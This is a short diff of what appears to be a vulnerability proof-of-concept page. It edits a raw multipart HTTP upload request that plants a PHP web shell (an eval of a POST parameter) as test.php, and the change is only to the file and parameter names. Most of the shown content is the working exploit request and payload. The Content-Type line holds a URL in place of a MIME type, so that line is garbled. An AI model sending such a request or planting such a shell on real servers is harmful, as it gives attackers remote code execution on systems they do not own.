@@ -39,10 +39,10 @@ Accept-Language: zh-CN,zh;q=0.9
 Connection: close
 
 ------WebKitFormBoundary8UaANmWAgM4BqBSs
-Content-Disposition: form-data; name="upfile"; filename="pq.php"
+Content-Disposition: form-data; name="upfile"; filename="test.php"
 Content-Type: http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/gif
 
-<?php @eval($_POST['pq']);?>
+<?php @eval($_POST['test']);?>
 ------WebKitFormBoundary8UaANmWAgM4BqBSs--
 ```
 
